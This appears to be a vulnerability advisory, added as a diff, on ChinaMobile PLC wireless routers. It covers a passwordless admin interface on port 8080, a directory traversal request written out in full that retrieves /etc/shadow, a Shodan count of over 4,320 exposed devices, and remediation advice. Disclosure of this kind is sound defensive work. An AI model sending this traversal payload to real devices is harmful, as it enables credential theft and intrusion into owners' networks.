@@ -1,0 +1,19 @@
+<h1>Insecure permissions and multiple vulnerabilities in ChinaMobile PLC wireless routers leaves more than 4,300 devices vulnerable to remote attacks Blank passwords and default factory settings</h1>
+
+ChinaMobile PLC Wireless Router model GPN2.4P21-C-CN running the firmware version W2000EN-01(hardware platform Gpn2.4P21-C_WIFI-V0.05) is shipped and deployed without an administrative password on port 8080 and the web configuration interface is accessible using the following syntax: http://<target ip>:8080. From the configuration page an attacker can change the router configuration or he can try to obtain access to the internal network.
+
+<h2>Directory traversal vulnerability</h2>
+A different directory traversal vulnerability than the one identified by Rahul Raz (https://www.exploit-db.com/exploits/40304) was identified by using:
+```
+GET /cgi-bin/webproc?getpage=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow&errorpage=html/main.html&var:language=zh_cn&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-
+```
+to retrieve the ```etc/shadow``` file where two user accounts were identified with the corresponding hashed passwords:
+```
+root:<hash_deleted>:13796:0:99999:7:::
+#tw:<hash_deleted>:13796:0:99999:7:::
+```
+<h2>Attack surface</h2>
+Over 4,320 vulnerable PLC Wireless routers were identified using Shodan. Most of the devices are located in South America (Argentina, Brazil, Honduras, Colombia) followed by Asia (Indonesia, India, Thailand).
+
+<h2>Remediation</h2>
+Adding a password to the admin user accounts should reduce the risk of being exploited. The risk of a successful directory traversal still exist and given the fact that the user can’t change the tw account password other risk mitigation strategies should be employed.
